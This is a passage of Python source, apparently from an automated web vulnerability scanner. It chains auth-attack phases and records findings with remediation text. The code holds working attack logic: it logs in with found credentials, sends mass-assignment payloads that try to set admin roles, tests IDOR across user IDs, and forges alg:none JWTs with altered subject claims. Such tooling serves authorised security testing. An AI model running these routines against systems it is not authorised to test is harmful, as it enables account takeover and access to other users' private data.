            sev_map = {"critical": Severity.CRITICAL, "high": Severity.HIGH,
                       "medium": Severity.MEDIUM, "low": Severity.LOW}
            vt_map = {v.value: v for v in VulnType}

            saved = 0
            for f in findings:
                vuln = Vulnerability(
                    target_id=self.context["target_id"],
                    scan_id=self.context["scan_id"],
                    title=f.get("title", "Service vulnerability")[:500],
                    vuln_type=vt_map.get(f.get("vuln_type", ""), VulnType.MISCONFIGURATION),
                    severity=sev_map.get(f.get("severity", "medium"), Severity.MEDIUM),
                    url=f.get("url", "")[:2000],
                    method=f.get("method"),
                    description=f.get("impact", ""),
                    payload_used=f.get("payload"),
                    remediation=f.get("remediation"),
                    ai_confidence=0.95,
                    request_data=f.get("request_data"),
                    response_data=f.get("response_data"),
                )
                result = await self._save_vuln_deduped(db, vuln, scan=scan, track_context=True, finding_dict=f)
                if result:
                    saved += 1

            await self.log(db, "service_attack",
                f"Service attacks found {saved} new vulnerabilities ({len(findings) - saved} deduped)", "warning")
        else:
            await self.log(db, "service_attack", "No service vulnerabilities found")

    async def _phase_auth_attack(self, db: AsyncSession):
        """Brute force login forms, test default credentials, then leverage authenticated access."""
        sem = asyncio.Semaphore(self.context.get("rate_limit") or 5)
        mod = AuthAttackModule(rate_limit=sem)
        findings = await mod.run(self.context)
        # Filter out known false positives
        if findings:
            findings = await self._filter_false_positives(findings, db, "auth_attack")
        if findings:
            scan_result = await db.execute(select(Scan).where(Scan.id == self.context["scan_id"]))
            scan = scan_result.scalar_one_or_none()
            vt_map = {v.value: v for v in VulnType}
            sev_map = {"critical": Severity.CRITICAL, "high": Severity.HIGH,
                       "medium": Severity.MEDIUM, "low": Severity.LOW}

            saved = 0
            for f in findings:
                vuln = Vulnerability(
                    target_id=self.context["target_id"],
                    scan_id=self.context["scan_id"],
                    title=f.get("title", "Auth vulnerability")[:500],
                    vuln_type=vt_map.get(f.get("vuln_type", "auth_bypass"), VulnType.AUTH_BYPASS),
                    severity=sev_map.get(f.get("severity", "medium"), Severity.MEDIUM),
                    url=f.get("url", "")[:2000],
                    method=f.get("method"),
                    description=f.get("impact", ""),
                    payload_used=f.get("payload"),
                    remediation=f.get("remediation"),
                    ai_confidence=0.9,
                    request_data=f.get("request_data"),
                    response_data=f.get("response_data"),
                )
                result = await self._save_vuln_deduped(db, vuln, scan=scan, track_context=True, finding_dict=f)
                if result:
                    saved += 1

            await self.log(db, "auth_attack",
                f"Auth attacks found {saved} new vulnerabilities ({len(findings) - saved} deduped)", "warning")

            # --- Auth session propagation: extract creds and establish session ---
            if not self.context.get("auth_cookie"):
                await self._propagate_auth_session(findings, db)

            # --- Post-auth endpoint discovery and privilege escalation ---
            if self.context.get("auth_cookie"):
                await self._post_auth_deep_scan(db)
        else:
            await self.log(db, "auth_attack", "No auth vulnerabilities found")

    async def _propagate_auth_session(self, findings: list[dict], db: AsyncSession):
        """Extract valid credentials from auth_attack findings, login, and propagate session."""
        base_url = self.context.get("base_url", "")
        for f in findings:
            # Check for API token directly
            if f.get("auth_token"):
                token = f["auth_token"]
                self.context["auth_cookie"] = f"token={token}"
                self.context["auth_headers"] = {"Authorization": f"Bearer {token}"}
                creds = f.get("valid_credentials", {})
                self.context["valid_credentials"] = [creds] if creds else []
                await self.log(db, "auth_attack",
                    f"Auth session propagated via API token from {f.get('url', 'unknown')}")
                return

            # Check for session cookies from form login
            if f.get("session_cookies"):
                cookies = f["session_cookies"]
                self.context["session_cookies"] = cookies
                cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
                self.context["auth_cookie"] = cookie_str
                creds = f.get("valid_credentials", {})
                self.context["valid_credentials"] = [creds] if creds else []
                await self.log(db, "auth_attack",
                    f"Auth session propagated via cookies from {f.get('url', 'unknown')}")
                return

            # No direct session data — re-login to get fresh session
            creds = f.get("valid_credentials")
            if not creds:
                continue

            username = creds.get("username", "")
            password = creds.get("password", "")
            login_url = creds.get("login_url", "")
            login_type = creds.get("login_type", "form")

            if not username or not login_url:
                continue

            try:
                from app.utils.http_client import make_client
                if login_type == "api":
                    # JSON API login
                    async with make_client(timeout=15.0, follow_redirects=True) as client:
                        for payload_template in [
                            {"username": username, "password": password},
                            {"email": username, "password": password},
                        ]:
                            resp = await client.post(login_url, json=payload_template)
                            if resp.status_code == 200:
                                try:
                                    data = resp.json()
                                    for key in ("token", "access_token", "accessToken", "jwt",
                                                "session_token", "auth_token"):
                                        token = data.get(key) or (data.get("data", {}) or {}).get(key)
                                        if token and isinstance(token, str) and len(token) > 10:
                                            self.context["auth_cookie"] = f"token={token}"
                                            self.context["auth_headers"] = {
                                                "Authorization": f"Bearer {token}"
                                            }
                                            self.context["valid_credentials"] = [creds]
                                            await self.log(db, "auth_attack",
                                                f"Auth session established: re-login as {username}")
                                            return
                                except Exception:
                                    pass
                            # Check for session cookies
                            if resp.cookies:
                                session_keys = [k for k in resp.cookies.keys()
                                                if any(s in k.lower()
                                                       for s in ("session", "token", "auth", "sid"))]
                                if session_keys:
                                    cookies = dict(resp.cookies)
                                    self.context["session_cookies"] = cookies
                                    cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
                                    self.context["auth_cookie"] = cookie_str
                                    self.context["valid_credentials"] = [creds]
                                    await self.log(db, "auth_attack",
                                        f"Auth session established via API cookies: {username}")
                                    return
                else:
                    # Form-based login — don't follow redirects to capture cookies
                    async with make_client(timeout=15.0, follow_redirects=False) as client:
                        form = creds.get("form", {})
                        form_data = dict(form.get("other_fields", {}))
                        form_data[form.get("username_field", "username")] = username
                        form_data[form.get("password_field", "password")] = password

                        # Re-fetch for fresh CSRF (need a separate client for this)
                        if form.get("csrf_token"):
                            async with make_client(timeout=10.0, follow_redirects=True) as csrf_client:
                                page_resp = await csrf_client.get(form.get("page_url", login_url))
                                from app.modules.auth_attack import AuthAttackModule
                                temp_mod = AuthAttackModule()
                                fresh_form = temp_mod._extract_login_form(page_resp.text, form.get("page_url", login_url))
                                if fresh_form and fresh_form.get("csrf_token"):
                                    token_name, token_value = fresh_form["csrf_token"]
                                    form_data[token_name] = token_value

                        resp = await client.post(login_url, data=form_data)

                        # Extract session from response
                        if resp.cookies:
                            cookies = dict(resp.cookies)
                            self.context["session_cookies"] = cookies
                            cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
                            self.context["auth_cookie"] = cookie_str
                            self.context["valid_credentials"] = [creds]
                            await self.log(db, "auth_attack",
                                f"Auth session established via form login: {username}")
                            return

                        # Follow redirect manually and check for cookies
                        if resp.status_code in (301, 302, 303, 307):
                            location = resp.headers.get("location", "")
                            if location:
                                from urllib.parse import urljoin
                                redirect_url = urljoin(login_url, location)
                                async with make_client(timeout=10.0, follow_redirects=True) as redir_client:
                                    resp2 = await redir_client.get(redirect_url)
                                    if resp2.cookies:
                                        cookies = dict(resp2.cookies)
                                        self.context["session_cookies"] = cookies
                                        cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
                                        self.context["auth_cookie"] = cookie_str
                                        self.context["valid_credentials"] = [creds]
                                        await self.log(db, "auth_attack",
                                            f"Auth session established via form redirect: {username}")
                                        return

            except Exception as e:
                await self.log(db, "auth_attack",
                    f"Re-login failed for {username}: {e}", "warning")
                continue

        await self.log(db, "auth_attack",
            "Could not establish auth session from found credentials", "warning")

    async def _post_auth_deep_scan(self, db: AsyncSession):
        """After auth_attack establishes a session, discover new endpoints and test privilege escalation."""
        base_url = self.context.get("base_url", "")
        auth_cookie = self.context.get("auth_cookie", "")
        if not base_url or not auth_cookie:
            return

        await self.log(db, "auth_attack", "Starting post-auth deep scan (endpoint discovery + privesc)")

        # --- 1. Post-auth endpoint discovery: revisit URLs that were 401/403 before ---
        from app.utils.http_client import make_client
        from urllib.parse import urljoin

        def _build_auth_headers(cookie: str) -> dict:
            headers = {}
            if cookie.startswith("token="):
                headers["Authorization"] = f"Bearer {cookie.split('=', 1)[1]}"
            else:
                headers["Cookie"] = cookie
            # Also add auth_headers if available
            for k, v in self.context.get("auth_headers", {}).items():
                headers[k] = v
            return headers

        auth_headers = _build_auth_headers(auth_cookie)

        # Protected paths to probe with authenticated session
        protected_paths = [
            "/admin", "/admin/", "/admin/dashboard", "/admin/users", "/admin/settings",
            "/dashboard", "/panel", "/settings", "/profile", "/account",
            "/users", "/manage", "/internal", "/reports", "/billing",
            "/api/admin", "/api/admin/users", "/api/admin/settings",
            "/api/users", "/api/me", "/api/profile", "/api/account",
            "/api/settings", "/api/v1/users", "/api/v1/admin",
            "/api/v1/me", "/api/v1/settings", "/api/v1/admin/users",
        ]

        new_auth_endpoints = []
        privesc_findings = []
        sem = asyncio.Semaphore(self.context.get("rate_limit") or 5)

        async def _probe_endpoint(path: str):
            url = urljoin(base_url + "/", path)
            try:
                async with sem:
                    async with make_client(timeout=10.0, follow_redirects=True,
                                           extra_headers=auth_headers) as client:
                        resp = await client.get(url)
                        if resp.status_code < 400:
                            body = resp.text.lower()
                            content_type = resp.headers.get("content-type", "")

                            # Skip SPA shells / empty responses
                            if len(resp.text) < 50:
                                return

                            new_auth_endpoints.append({
                                "url": url,
                                "status": resp.status_code,
                                "type": "authenticated",
                                "method": "GET",
                            })

                            # Check for admin/privileged content
                            admin_indicators = [
                                "admin panel", "user management", "system settings",
                                "all users", "manage users", "admin dashboard",
                                "configuration", "system config", "role",
                            ]
                            if any(ind in body for ind in admin_indicators):
                                if "/admin" in path:
                                    privesc_findings.append({
                                        "url": url,
                                        "type": "admin_access",
                                        "evidence": f"Accessed admin endpoint with regular credentials (HTTP {resp.status_code})",
                                        "body_preview": resp.text[:500],
                                    })
            except Exception:
                pass

        # Probe all protected paths in parallel
        await asyncio.gather(
            *[_probe_endpoint(p) for p in protected_paths],
            return_exceptions=True,
        )

        # Merge new endpoints into context
        if new_auth_endpoints:
            existing = self.context.get("endpoints", [])
            existing_urls = {(ep.get("url") if isinstance(ep, dict) else ep) for ep in existing}
            added = 0
            for ep in new_auth_endpoints:
                if ep["url"] not in existing_urls:
                    existing.append(ep)
                    existing_urls.add(ep["url"])
                    added += 1
            self.context["endpoints"] = existing
            await self.log(db, "auth_attack",
                f"Post-auth discovery: {added} new authenticated endpoints found")

        # --- 2. Privilege escalation: test admin endpoints with regular user session ---
        scan_result = await db.execute(select(Scan).where(Scan.id == self.context["scan_id"]))
        scan = scan_result.scalar_one_or_none()

        if privesc_findings:
            for pf in privesc_findings:
                vuln = Vulnerability(
                    target_id=self.context["target_id"],
                    scan_id=self.context["scan_id"],
                    title=f"Privilege escalation: admin endpoint accessible ({pf['url']})"[:500],
                    vuln_type=VulnType.AUTH_BYPASS,
                    severity=Severity.CRITICAL,
                    url=pf["url"][:2000],
                    method="GET",
                    description=f"Admin endpoint {pf['url']} is accessible with regular user credentials. "
                               f"{pf['evidence']}",
                    impact="Vertical privilege escalation — regular user can access admin functionality.",
                    remediation="Implement role-based access control (RBAC). "
                               "Verify user roles server-side before granting access to admin endpoints.",
                    ai_confidence=0.85,
                    response_data={"body_preview": pf.get("body_preview", "")},
                )
                await self._save_vuln_deduped(db, vuln, scan=scan)
            await self.log(db, "auth_attack",
                f"Privilege escalation: {len(privesc_findings)} admin endpoints accessible", "warning")

        # --- 3. Mass assignment check: try adding admin/role params to profile update ---
        await self._test_mass_assignment_privesc(db, auth_headers, sem, scan)

        # --- 4. Auth-required IDOR: test accessing other users' data ---
        await self._test_auth_idor(db, auth_headers, sem, scan)

    async def _test_mass_assignment_privesc(self, db: AsyncSession, auth_headers: dict,
                                             sem: asyncio.Semaphore, scan):
        """Test if profile/settings endpoints accept role/admin parameters (mass assignment for privesc)."""
        from app.utils.http_client import make_client
        from urllib.parse import urljoin
        base_url = self.context.get("base_url", "")

        profile_endpoints = [
            "/api/me", "/api/profile", "/api/user", "/api/account",
            "/api/v1/me", "/api/v1/profile", "/api/v1/user",
            "/api/users/me", "/api/v1/users/me",
            "/api/settings", "/api/v1/settings",
        ]

        # Payloads that attempt to escalate privileges
        privesc_payloads = [
            {"role": "admin"},
            {"admin": True},
            {"is_admin": True},
            {"role": "administrator"},
            {"user_type": "admin"},
            {"permissions": ["admin"]},
            {"isAdmin": True},
            {"access_level": 999},
        ]

        for path in profile_endpoints:
            url = urljoin(base_url + "/", path)
            try:
                async with sem:
                    async with make_client(timeout=10.0, extra_headers=auth_headers) as client:
                        # First GET to check if endpoint exists
                        get_resp = await client.get(url)
                        if get_resp.status_code >= 400:
                            continue

                        # Try PATCH/PUT with privilege escalation params
                        for payload in privesc_payloads[:4]:  # Limit attempts
                            for method_name, method_fn in [("PATCH", client.patch), ("PUT", client.put)]:
                                try:
                                    resp = await method_fn(
                                        url, json=payload,
                                        headers={"Content-Type": "application/json"},
                                    )
                                    if resp.status_code in (200, 201):
                                        # Check if the role/admin field was accepted
                                        try:
                                            resp_data = resp.json()
                                            if isinstance(resp_data, dict):
                                                for key in ("role", "admin", "is_admin", "isAdmin",
                                                            "user_type", "access_level"):
                                                    val = resp_data.get(key)
                                                    if val and str(val).lower() in ("admin", "administrator",
                                                                                     "true", "999"):
                                                        vuln = Vulnerability(
                                                            target_id=self.context["target_id"],
                                                            scan_id=self.context["scan_id"],
                                                            title=f"Mass assignment privilege escalation via {key}={val}"[:500],
                                                            vuln_type=VulnType.PRIVILEGE_ESCALATION,
                                                            severity=Severity.CRITICAL,
                                                            url=url[:2000],
                                                            parameter=key,
                                                            method=method_name,
                                                            description=f"Setting {key}={val} via {method_name} {url} "
                                                                       f"was accepted by the server, potentially granting admin access.",
                                                            impact="Vertical privilege escalation through mass assignment.",
                                                            remediation="Whitelist allowed update fields server-side. "
                                                                       "Never allow role/admin fields in user-facing update endpoints.",
                                                            payload_used=json.dumps(payload) if isinstance(payload, dict) else str(payload),
                                                            request_data={"method": method_name,
                                                                          "url": url, "body": payload},
                                                            response_data={"status_code": resp.status_code,
                                                                           "body_preview": resp.text[:1000]},
                                                            ai_confidence=0.8,
                                                        )
                                                        await self._save_vuln_deduped(db, vuln, scan=scan)
                                                        await self.log(db, "auth_attack",
                                                            f"Mass assignment privesc: {key}={val} accepted at {url}", "warning")
                                                        return  # Found one, stop
                                        except Exception:
                                            pass
                                except Exception:
                                    continue
            except Exception:
                continue

    async def _test_auth_idor(self, db: AsyncSession, auth_headers: dict,
                               sem: asyncio.Semaphore, scan):
        """With authenticated session, test accessing other users' resources (IDOR)."""
        from app.utils.http_client import make_client
        from urllib.parse import urljoin
        base_url = self.context.get("base_url", "")

        # Get our own user ID if available
        own_user_id = None
        harvested = self.context.get("harvested_ids", {})
        auto_reg = self.context.get("auto_register_result", {})
        if auto_reg.get("user_id"):
            own_user_id = str(auto_reg["user_id"])
        elif harvested.get("user_id"):
            ids = harvested["user_id"]
            own_user_id = ids[-1] if isinstance(ids, list) and ids else None

        # ID sequences to test
        test_ids = ["1", "2", "3", "0"]
        if own_user_id:
            try:
                own_int = int(own_user_id)
                test_ids = [str(own_int - 1), str(own_int + 1), "1", "2"]
            except (ValueError, TypeError):
                pass
            # Remove own ID from test set
            test_ids = [i for i in test_ids if i != own_user_id]

        # IDOR target patterns
        idor_paths = [
            "/api/users/{id}", "/api/v1/users/{id}", "/api/v2/users/{id}",
            "/api/accounts/{id}", "/api/v1/accounts/{id}",
            "/api/profiles/{id}", "/api/v1/profiles/{id}",
            "/api/orders/{id}", "/api/v1/orders/{id}",
            "/api/user/{id}", "/api/account/{id}",
        ]

        findings_count = 0
        tested = set()

        for path_template in idor_paths:
            for test_id in test_ids[:3]:
                path = path_template.replace("{id}", test_id)
                url = urljoin(base_url + "/", path)
                if url in tested:
                    continue
                tested.add(url)

                try:
                    async with sem:
                        async with make_client(timeout=10.0, extra_headers=auth_headers) as client:
                            resp = await client.get(url)
                            if resp.status_code == 200 and len(resp.text) > 50:
                                try:
                                    data = resp.json()
                                    if isinstance(data, dict):
                                        # Check if we got a different user's data
                                        resp_id = str(data.get("id", data.get("user_id",
                                                     data.get("userId", ""))))
                                        if resp_id and resp_id == test_id and resp_id != own_user_id:
                                            # Check for PII to confirm it's real data
                                            pii_keys = {"email", "phone", "name", "address",
                                                        "ssn", "dob", "password", "secret"}
                                            has_pii = bool(pii_keys & set(str(k).lower() for k in data.keys()))
                                            if has_pii:
                                                vuln = Vulnerability(
                                                    target_id=self.context["target_id"],
                                                    scan_id=self.context["scan_id"],
                                                    title=f"IDOR: accessed user {test_id} data via {path}"[:500],
                                                    vuln_type=VulnType.AUTH_BYPASS,
                                                    severity=Severity.HIGH,
                                                    url=url[:2000],
                                                    parameter="id",
                                                    method="GET",
                                                    description=f"Authenticated as one user, successfully accessed user {test_id}'s data "
                                                               f"at {url}. Response contains PII fields: {list(pii_keys & set(str(k).lower() for k in data.keys()))}",
                                                    impact="Horizontal privilege escalation — can access any user's data by changing ID.",
                                                    remediation="Implement object-level authorization. Verify the requesting user "
                                                               "owns the requested resource before returning data.",
                                                    payload_used=f"GET {url}",
                                                    request_data={"method": "GET", "url": url},
                                                    response_data={"status_code": 200,
                                                                   "body_preview": resp.text[:1000]},
                                                    ai_confidence=0.85,
                                                )
                                                await self._save_vuln_deduped(db, vuln, scan=scan)
                                                findings_count += 1
                                except Exception:
                                    pass
                except Exception:
                    continue

        if findings_count:
            await self.log(db, "auth_attack",
                f"Auth IDOR testing: {findings_count} horizontal privesc findings", "warning")

        # --- JWT sub claim tampering ---
        await self._test_jwt_tampering(db, auth_headers, sem, scan)

    async def _test_jwt_tampering(self, db: AsyncSession, auth_headers: dict,
                                   sem: asyncio.Semaphore, scan):
        """If we have a JWT, test if modifying the sub claim bypasses authorization."""
        import base64
        from app.utils.http_client import make_client
        from urllib.parse import urljoin
        base_url = self.context.get("base_url", "")

        auth_cookie = self.context.get("auth_cookie", "")
        token = None
        if auth_cookie.startswith("token="):
            token = auth_cookie.split("=", 1)[1]
        elif self.context.get("auth_headers", {}).get("Authorization", "").startswith("Bearer "):
            token = self.context["auth_headers"]["Authorization"].split(" ", 1)[1]
        # Also check harvested tokens
        if not token:
            token = self.context.get("harvested_tokens", {}).get("auth_bearer")

        if not token or not token.startswith("eyJ"):
            return  # Not a JWT

        try:
            # Decode JWT header and payload (without verification)
            parts = token.split(".")
            if len(parts) != 3:
                return

            # Decode payload
            payload_b64 = parts[1] + "=" * (4 - len(parts[1]) % 4)
            payload_json = base64.urlsafe_b64decode(payload_b64)
            payload_data = json.loads(payload_json)

            sub = payload_data.get("sub")
            user_id = payload_data.get("user_id") or payload_data.get("userId") or payload_data.get("id")
            original_id = sub or user_id

            if not original_id:
                return

            # Try alg:none attack
            header_b64 = parts[0] + "=" * (4 - len(parts[0]) % 4)
            header_json = base64.urlsafe_b64decode(header_b64)
            header_data = json.loads(header_json)

            # Forge token with alg:none and modified sub
            forged_header = base64.urlsafe_b64encode(
                json.dumps({"alg": "none", "typ": "JWT"}).encode()
            ).rstrip(b"=").decode()

            test_id = "1" if str(original_id) != "1" else "2"
            modified_payload = dict(payload_data)
            if sub:
                modified_payload["sub"] = test_id
            if user_id:
                for k in ("user_id", "userId", "id"):
                    if k in modified_payload:
                        modified_payload[k] = test_id

            forged_payload = base64.urlsafe_b64encode(
                json.dumps(modified_payload).encode()
            ).rstrip(b"=").decode()

            forged_token = f"{forged_header}.{forged_payload}."

            # Test forged token against /api/me or similar
            test_endpoints = ["/api/me", "/api/v1/me", "/api/profile", "/api/user"]
            for path in test_endpoints:
                url = urljoin(base_url + "/", path)
                try:
                    async with sem:
                        forged_headers = {"Authorization": f"Bearer {forged_token}"}
                        async with make_client(timeout=10.0, extra_headers=forged_headers) as client:
                            resp = await client.get(url)
                            if resp.status_code == 200 and len(resp.text) > 50:
                                try:
                                    data = resp.json()
                                    resp_id = str(data.get("id", data.get("sub",
                                                 data.get("user_id", ""))))
                                    if resp_id == test_id:
                                        vuln = Vulnerability(
                                            target_id=self.context["target_id"],
                                            scan_id=self.context["scan_id"],
                                            title=f"JWT alg:none bypass — accessed user {test_id}"[:500],
                                            vuln_type=VulnType.AUTH_BYPASS,
                                            severity=Severity.CRITICAL,
                                            url=url[:2000],
                                            method="GET",
                                            description=f"JWT token with alg:none and modified sub={test_id} "
                                                       f"was accepted by {url}. Server does not verify JWT signature.",
                                            impact="Complete authentication bypass. Any user's identity can be assumed "
                                                   "by forging JWT tokens with algorithm set to 'none'.",
                                            remediation="Always verify JWT signatures server-side. "
                                                       "Reject tokens with alg:none. Use a strong signing algorithm (RS256/ES256).",
                                            payload_used=f"JWT alg:none: {forged_token[:80]}...",
                                            request_data={"method": "GET", "url": url,
                                                          "headers": forged_headers},
                                            response_data={"status_code": 200,
                                                           "body_preview": resp.text[:1000]},
                                            ai_confidence=0.95,
                                        )
                                        await self._save_vuln_deduped(db, vuln, scan=scan)
                                        await self.log(db, "auth_attack",
                                            "JWT alg:none bypass confirmed!", "warning")
                                        return
                                except Exception:
                                    pass
                except Exception:
                    continue

        except Exception as e:
            logger.debug(f"JWT tampering test error: {e}")

    async def _phase_account_enumeration(self, db: AsyncSession):
        """Detect user existence via side channels in auth flows."""
        sem = asyncio.Semaphore(self.context.get("rate_limit") or 5)
        mod = AccountEnumerationModule(rate_limit=sem)
        findings = await mod.run(self.context)
        if findings:
            findings = await self._filter_false_positives(findings, db, "account_enumeration")
        if findings:
            scan_result = await db.execute(select(Scan).where(Scan.id == self.context["scan_id"]))
            scan = scan_result.scalar_one_or_none()
            sev_map = {"critical": Severity.CRITICAL, "high": Severity.HIGH,
                       "medium": Severity.MEDIUM, "low": Severity.LOW}

            saved = 0
            for f in findings:
                raw_type = f.get("vuln_type", "info_disclosure")
                vuln_type = VULN_TYPE_ALIASES.get(raw_type, VulnType.INFO_DISCLOSURE)
                vuln = Vulnerability(
                    target_id=self.context["target_id"],
                    scan_id=self.context["scan_id"],
                    title=f.get("title", "Account enumeration")[:500],
                    vuln_type=vuln_type,
                    severity=sev_map.get(f.get("severity", "medium"), Severity.MEDIUM),
                    url=f.get("url", "")[:2000],
                    method=f.get("method"),
                    description=f.get("impact", ""),
                    payload_used=f.get("payload"),
                    remediation=f.get("remediation"),
                    ai_confidence=0.85,
                    request_data=f.get("request_data"),
                    response_data=f.get("response_data"),
                )
                result = await self._save_vuln_deduped(db, vuln, scan=scan, track_context=True, finding_dict=f)
                if result:
                    saved += 1

            await self.log(db, "account_enumeration",
                f"Account enumeration found {saved} new vulnerabilities ({len(findings) - saved} deduped)", "warning")
        else:
            await self.log(db, "account_enumeration", "No account enumeration issues found")

    async def _phase_mfa_bypass(self, db: AsyncSession):
        """Test for weak or bypassable multi-factor authentication."""
        sem = asyncio.Semaphore(self.context.get("rate_limit") or 5)
        mod = MFABypassModule(rate_limit=sem)
        findings = await mod.run(self.context)
        if findings:
            findings = await self._filter_false_positives(findings, db, "mfa_bypass")
        if findings:
            scan_result = await db.execute(select(Scan).where(Scan.id == self.context["scan_id"]))
            scan = scan_result.scalar_one_or_none()
            sev_map = {"critical": Severity.CRITICAL, "high": Severity.HIGH,
                       "medium": Severity.MEDIUM, "low": Severity.LOW}

            saved = 0
            for f in findings:
                raw_type = f.get("vuln_type", "auth_bypass")
                vuln_type = VULN_TYPE_ALIASES.get(raw_type, VulnType.AUTH_BYPASS)
                vuln = Vulnerability(
                    target_id=self.context["target_id"],
                    scan_id=self.context["scan_id"],
                    title=f.get("title", "MFA bypass vulnerability")[:500],
                    vuln_type=vuln_type,
                    severity=sev_map.get(f.get("severity", "high"), Severity.HIGH),
                    url=f.get("url", "")[:2000],
                    method=f.get("method"),
                    description=f.get("impact", ""),
                    payload_used=f.get("payload"),
                    remediation=f.get("remediation"),
                    ai_confidence=0.9,
                    request_data=f.get("request_data"),
                    response_data=f.get("response_data"),
                )
                result = await self._save_vuln_deduped(db, vuln, scan=scan, track_context=True, finding_dict=f)
                if result:
                    saved += 1

            await self.log(db, "mfa_bypass",
                f"MFA bypass found {saved} new vulnerabilities ({len(findings) - saved} deduped)", "warning")
        else:
            await self.log(db, "mfa_bypass", "No MFA bypass vulnerabilities found")

    async def _phase_browser_scan(self, db: AsyncSession):
        """Headless Chrome: SPA crawling, DOM XSS detection, client-side JS analysis."""
        try:
            from app.modules.browser import BrowserModule
        except ImportError:
            await self.log(db, "browser_scan", "Browser module not available (playwright not installed)")
            return

        base_url = self.context.get("base_url", "")
        if not base_url:
            return

        # Detect if target is likely SPA (React/Angular/Vue/Next)
        technologies = self.context.get("technologies", [])
        tech_str = str(technologies).lower()
        is_spa = any(fw in tech_str for fw in [
            "react", "angular", "vue", "next", "nuxt", "svelte", "ember",
            "backbone", "single-page", "spa",
        ])

        # Also check if initial page has minimal HTML (SPA indicator)
        endpoints = self.context.get("endpoints", [])
        if not is_spa and len(endpoints) < 5:
            is_spa = True  # Few static endpoints = likely SPA

        sem = asyncio.Semaphore(self.context.get("rate_limit") or 3)
        browser_mod = BrowserModule(rate_limit=sem)

        try:
            # Phase 1: SPA crawl — discover JS-rendered endpoints
            auth_cookie = self.context.get("auth_cookie")
            max_pages = 30 if is_spa else 15

            await self.log(db, "browser_scan",
                f"Browser crawling {'SPA' if is_spa else 'site'} ({max_pages} pages max)...")

            crawl_result = await browser_mod.crawl_spa(
                base_url, auth_cookie=auth_cookie, max_pages=max_pages
            )

            # Merge discovered links into endpoints
            new_endpoints = 0
            existing_urls = {
                (ep if isinstance(ep, str) else ep.get("url", ""))
                for ep in endpoints
            }
            for link in crawl_result.get("links_found", []):
                if link not in existing_urls:
                    endpoints.append({"url": link, "method": "GET", "source": "browser"})
                    new_endpoints += 1

            # Merge API calls
            for api_call in crawl_result.get("api_calls", []):
                parts = api_call.split(" ", 1)
                if len(parts) == 2:
                    method, url = parts
                    if url not in existing_urls:
                        endpoints.append({"url": url, "method": method, "source": "browser_api"})
                        new_endpoints += 1

            self.context["endpoints"] = endpoints
            self.context["browser_js_files"] = crawl_result.get("js_files", [])
            self.context["browser_forms"] = crawl_result.get("forms", [])

            await self.log(db, "browser_scan",
                f"Browser crawled {crawl_result.get('pages_visited', 0)} pages, "
                f"found {new_endpoints} new endpoints, "
                f"{len(crawl_result.get('api_calls', []))} API calls, "
                f"{len(crawl_result.get('forms', []))} forms")

            # Phase 2: DOM XSS browser-based testing
            test_endpoints = [
                ep if isinstance(ep, str) else ep.get("url", "")
                for ep in endpoints[:15]
            ]
            dom_xss_findings = await browser_mod.check_dom_xss(
                base_url, test_endpoints, auth_cookie=auth_cookie
            )
            for finding in dom_xss_findings:
                vuln = Vulnerability(
                    scan_id=self.scan_id,
                    target_id=self.context["target_id"],
                    vuln_type=VulnType.XSS_DOM,
                    severity=Severity(finding.get("severity", "high")),
                    title=f"[Browser] {finding['title']}",
                    url=finding.get("url", base_url),
                    description=finding.get("impact", ""),
                    remediation=finding.get("remediation", ""),
                    payload_used=finding.get("payload", ""),
                    response_data={"injection_point": finding.get("injection_point"), "source": "browser"},
                )
                await self._save_vuln_deduped(db, vuln)

            if dom_xss_findings:
                await self.log(db, "browser_scan",
                    f"Browser DOM XSS: {len(dom_xss_findings)} confirmed (executed in real browser)", "warning")

            # Phase 3: Client JS analysis (dangerous patterns)
            js_files = crawl_result.get("js_files", [])
            if js_files:
                js_findings = await browser_mod.analyze_client_js(base_url, js_files[:15])
                # Only save HIGH severity JS findings (source→sink flows)
                saved_js = 0
                for finding in js_findings:
                    if finding.get("severity") in ("high", "critical"):
                        vuln = Vulnerability(
                            scan_id=self.scan_id,
                            target_id=self.context["target_id"],
                            vuln_type=VulnType.INFO_DISCLOSURE,
                            severity=Severity(finding.get("severity", "medium")),
                            title=f"[Browser] {finding['title']}",
                            url=finding.get("url", base_url),
                            description=finding.get("impact", ""),
                            remediation=finding.get("remediation", ""),
                            response_data={"pattern": finding.get("pattern"), "context": finding.get("context")},
                        )
                        await self._save_vuln_deduped(db, vuln)
                        saved_js += 1

                if saved_js:
                    await self.log(db, "browser_scan",
                        f"Client JS analysis: {saved_js} dangerous patterns found", "warning")

        except Exception as e:
            await self.log(db, "browser_scan", f"Browser scan error: {e}", "warning")
        finally:
            try:
                await browser_mod.close()
            except Exception:
                pass

    async def _phase_app_graph(self, db: AsyncSession):
        """Build application model / attack graph from discovered endpoints."""
        try:
            builder = ApplicationGraphBuilder(self.context)
            graph = await builder.build()
            self.context["application_graph"] = graph

            entities_count = len(graph.get("entities", {}))
            relationships_count = len(graph.get("relationships", []))
            attack_paths_count = len(graph.get("attack_paths", []))

            await self.log(db, "app_graph",
                f"Application graph: {entities_count} entities, "
                f"{relationships_count} relationships, "
                f"{attack_paths_count} attack paths identified")

            # Log high-risk attack paths
            for path in graph.get("attack_paths", [])[:3]:
                await self.log(db, "app_graph",
                    f"Attack path [{path.get('risk', 'unknown')}]: {path.get('name', 'unnamed')}", "warning")
        except Exception as e:
            await self.log(db, "app_graph", f"Application graph error (non-fatal): {e}", "error")

    async def _phase_stateful_crawl(self, db: AsyncSession):
        """Deep stateful crawling with session management."""
        try:
            crawler = StatefulCrawler(self.context)
            results = await crawler.crawl()
            self.context["stateful_crawl"] = results

            forms_count = len(results.get("forms", []))
            transitions_count = len(results.get("state_transitions", []))
            auth_endpoints = len(results.get("authenticated_endpoints", []))
            flows_count = len(results.get("multi_step_flows", []))
            ids_count = sum(len(v) for v in results.get("harvested_ids", {}).values())

            # Propagate auth session from stateful_crawl to context
            if results.get("session_cookies"):
                self.context["session_cookies"] = results["session_cookies"]
                # Build auth_cookie string from session cookies for downstream phases
                cookie_str = "; ".join(f"{k}={v}" for k, v in results["session_cookies"].items())
                if cookie_str and not self.context.get("auth_cookie"):
                    self.context["auth_cookie"] = cookie_str
                    await self.log(db, "stateful_crawl", f"Auth session propagated: {len(results['session_cookies'])} cookies")
            if results.get("auth_headers"):
                self.context["auth_headers"] = results["auth_headers"]
                # If bearer token found, set as auth_cookie for downstream
